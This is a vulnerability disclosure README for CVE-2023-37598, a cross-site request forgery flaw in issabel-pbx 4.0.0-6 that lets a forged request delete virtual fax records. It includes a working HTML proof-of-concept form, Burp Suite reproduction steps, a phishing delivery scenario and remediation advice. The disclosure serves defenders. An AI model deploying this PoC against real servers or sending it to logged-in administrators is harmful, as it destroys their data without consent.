# CVE-2023-37598 — issabel-pbx 4.0.0-6: Cross-Site Request Forgery (CSRF)

## Overview

**CVE ID:** CVE-2023-37598  
**Vulnerability Type:** Cross-Site Request Forgery (CSRF)  
**Affected Product:** issabel-pbx v4.0.0-6  
**Severity:** Medium  
**Discovered by:** Sahil Ojha  
**Disclosure Date:** 10/07/2023  
**Vendor Homepage:** https://www.issabel.org/  
**Software Repository:** https://github.com/IssabelFoundation/issabelPBX  
**Tested On:** Windows  

---

## Description

A **Cross-Site Request Forgery (CSRF)** vulnerability exists in **issabel-pbx v4.0.0-6** within the Virtual Fax management functionality. The application does not implement CSRF protection (e.g., anti-CSRF tokens or same-site cookie attributes) on the delete action for virtual fax entries.

This allows a remote, unauthenticated attacker to craft a malicious HTML page that — when visited by an authenticated administrator or user — silently submits a forged HTTP request to the application on the victim's behalf. The forged request causes the deletion of virtual fax records without the victim's knowledge or consent, resulting in loss of data and disruption of fax services.

### What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that tricks a victim's browser into sending an authenticated request to a web application without the user's intent. Because the browser automatically includes session cookies with every request, the server cannot distinguish a legitimate request from a forged one when no CSRF token is present.

---

## Impact

- **Data Loss:** An attacker can delete virtual fax entries belonging to any user, making fax data permanently inaccessible.
- **Unauthorized State Change:** Administrative fax records can be silently removed without any interaction or awareness from the legitimate user.
- **No Authentication Required for the Attacker:** The attacker does not need valid credentials — only the victim (who is already logged in) needs to visit the attacker-controlled page.

---

## Affected Component

| Parameter          | Value                                           |
|--------------------|-------------------------------------------------|
| Application        | issabel-pbx                                     |
| Version            | 4.0.0-6                                         |
| Vulnerable URL     | `/index.php?menu=faxnew&action=view&id=<ID>`    |
| Vulnerable Action  | `delete` (POST parameter)                       |
| Missing Protection | CSRF token / SameSite cookie attribute          |

---

## Proof of Concept (PoC)

The following HTML file, when opened by an authenticated issabel-pbx user, will automatically submit a forged POST request that deletes the virtual fax with `id_fax=1`.

**File:** [`CSRF exploit.html`](./CSRF%20exploit.html)

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://{Issabel IP}/index.php?menu=faxnew&action=view&id=1" method="POST">
      <input type="hidden" name="delete" value="Delete" />
      <input type="hidden" name="id_fax" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

> **Note:** Replace `{Issabel IP}` with the target server's IP address or hostname. The `id_fax` value can be changed to target any virtual fax record by its ID.

---

## Steps to Reproduce

1. **Log in** to the Issabel PBX admin panel and navigate to the Virtual Fax page:
   ```
   https://{Issabel IP}/index.php?menu=faxnew&action=view&id=1
   ```

   ![Step 1 – Issabel Virtual Fax page](https://github.com/sahiloj/CVE-2023-37598/blob/main/1.png)

2. **Capture the delete request** using Burp Suite proxy. Attempt to delete a Virtual Fax entry, intercept the request, right-click on it, and navigate to **Engagement Tools → Generate CSRF PoC**.

   ![Step 2 – Generate CSRF PoC in Burp Suite](https://github.com/sahiloj/CVE-2023-37598/blob/main/2.png)

3. **Save the generated CSRF exploit** as an HTML file (see the PoC above).

4. **Deliver the exploit** to a user who is already logged into the Issabel application (e.g., via a phishing email or a malicious link). When the victim opens the page and clicks **"Submit request"**, the Virtual Fax entry is deleted without any further interaction.

   ![Step 3 – CSRF exploit HTML rendered in browser](https://github.com/sahiloj/CVE-2023-37598/blob/main/3.png)

   ![Step 4 – Virtual Fax deleted from admin dashboard](https://github.com/sahiloj/CVE-2023-37598/blob/main/4.png)

---

## Attack Scenario

An attacker hosts the malicious HTML file on an external server or embeds it in an email. When an authenticated Issabel PBX administrator opens this page in the same browser session, the browser automatically sends the forged POST request — including the valid session cookie — to the Issabel server. The server processes the request as legitimate, deleting the targeted virtual fax record. The victim receives no warning and may not notice the deletion until they manually inspect the fax list.

---

## Remediation

To remediate this vulnerability, the vendor should implement one or more of the following mitigations:

1. **Anti-CSRF Tokens:** Include a unique, unpredictable, per-session token in all state-changing forms and verify it server-side before processing the request.
2. **SameSite Cookie Attribute:** Set the session cookie with `SameSite=Strict` or `SameSite=Lax` to prevent the browser from sending it with cross-origin requests.
3. **Custom Request Headers:** Require a custom HTTP header (e.g., `X-Requested-With: XMLHttpRequest`) for all sensitive operations, and verify it server-side.
4. **Re-authentication for Destructive Actions:** Prompt users to re-enter their password or confirm their identity before performing irreversible operations such as deletion.

---

## References

- [NVD – CVE-2023-37598](https://nvd.nist.gov/vuln/detail/CVE-2023-37598)
- [OWASP – Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [Issabel PBX GitHub Repository](https://github.com/IssabelFoundation/issabelPBX)
- [Issabel Official Website](https://www.issabel.org/)
